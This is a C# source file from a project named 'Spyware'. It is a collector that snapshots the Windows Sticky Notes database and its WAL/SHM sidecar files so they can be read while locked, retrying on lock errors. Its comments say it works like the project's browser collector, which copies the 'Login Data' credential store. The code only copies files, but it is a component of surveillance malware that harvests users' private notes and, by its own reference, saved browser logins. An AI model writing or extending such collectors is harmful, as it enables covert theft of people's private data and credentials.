using Spyware.Core.Contracts;
using Spyware.Core.Logging;

namespace Spyware.Collectors.Notes;

/// <summary>
/// Copia del almacén de notas antes de leerlo: Sticky Notes mantiene la base abierta y
/// en modo WAL, igual que el navegador con `Login Data`. Se abre la COPIA, nunca el
/// archivo original. Los sidecars `-wal`/`-shm` se copian detrás, con la misma limitación
/// no atómica que documenta `FileCopier` en el collector de navegadores.
/// </summary>
public static class SnapshotCopy
{
    public static bool TryCopy(string source, string destination, ILog log,
                               out string status, out string? reason, int attempts = 5)
    {
        reason = null;

        if (!File.Exists(source))
        {
            status = NoteStatus.NotFound;
            return false;
        }

        for (int attempt = 1; attempt <= attempts; attempt++)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(destination)!);
                File.Copy(source, destination, overwrite: true);

                CopySidecars(source, destination, log);

                status = NoteStatus.Read;
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                status = NoteStatus.AccessDenied;
                reason = "acceso denegado al archivo de Sticky Notes";
                return false;
            }
            catch (IOException) when (attempt < attempts)
            {
                reason = "bloqueado por Sticky Notes (intento " + attempt + ")";
                Thread.Sleep(200 * attempt);
            }
            catch (IOException)
            {
                status = NoteStatus.Locked;
                reason = "el archivo sigue bloqueado tras " + attempts + " intentos";
                return false;
            }
            catch (Exception ex)
            {
                status = NoteStatus.Corrupted;
                reason = "copia fallida: " + ex.GetType().Name;
                log.Debug("Copia de " + source + " falló: " + ex.Message);
                return false;
            }
        }

        status = NoteStatus.Locked;
        return false;
    }

    private static void CopySidecars(string source, string destination, ILog log)
    {
        foreach (string suffix in new[] { "-wal", "-shm" })
        {
            string sidecar = source + suffix;
            if (!File.Exists(sidecar)) continue;

            try
            {
                File.Copy(sidecar, destination + suffix, overwrite: true);
            }
            catch (Exception ex)
            {
                // Sin los sidecars la copia puede estar incompleta: se avisa, no se aborta.
                log.Debug("Sidecar " + suffix + " no copiado: " + ex.Message);
            }
        }
    }
}
